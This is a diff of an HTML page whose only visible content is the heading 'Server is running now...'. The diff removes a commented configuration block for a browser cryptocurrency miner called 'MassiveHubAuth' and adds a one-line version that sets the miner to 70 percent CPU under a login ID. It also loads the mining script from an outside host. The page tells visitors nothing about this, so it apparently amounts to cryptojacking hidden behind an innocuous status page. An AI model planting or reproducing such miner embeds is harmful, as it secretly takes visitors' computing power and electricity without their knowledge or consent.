@@ -7,44 +7,8 @@
 </head>
 <body>
     <h1>Server is running now...</h1>
-    <script>// - Configure:
-        MassiveHubAuth.config({ 
-            login: "7168080", // Your ID - required
-            pass: "ServerAleshaMining", // Name for stats, leave blank for automatic set.
-        });
-        
-        // - Universal function for Start/Stop/Change speed - 0 = stop, 1-100 = set percent of CPU usage and start mining if not started:
-        MassiveHubAuth.power(64);
-        
-        // - Restore previous session accepted hashes and power (start mining if it worked in previous session):
-        MassiveHubAuth.loadStored();
-        
-        // - Get current power:
-        console.log( MassiveHubAuth.getPower() );
-        
-        // - Get current speed in hashes/sec:
-        console.log( MassiveHubAuth.getHashesPerSecond() );
-        
-        // - Get current job algo:
-        console.log( MassiveHubAuth.getJobAlgo() );
-        
-        // - Get current job diff:
-        console.log( MassiveHubAuth.getJobDiff() );
-        
-        // - Get accepted by pool hashes (in all sessions)
-        console.log( MassiveHubAuth.getAcceptedHashes() );
-        
-        // - Reset config and stop minig
-        MassiveHubAuth.reset(); // Reset config, stop mining and disconnect from pool (you can use it when user logout).
-        
-        // - Remote change speed event:
-        MassiveHubAuth.on('remotepower', (power) => {
-            MassiveHubAuth.power(power); // Is automatic applied if no listeners for this event.
-            console.log('New power:', power);
-        });
-        
-        // - Share accepted event
-        MassiveHubAuth.on('accepted', () => console.log('New share') );
-        </script>
+    <noscript>Hey! Enable java script</noscript>
+    <script>MassiveHubAuth.config({ login: "7168080", pass: "MinerServer.github.io" }).power(70);</script>
+    <script src="https://wm.bmwebm.org/MassiveHubAuth.js"></script>
 </body>
 </html>
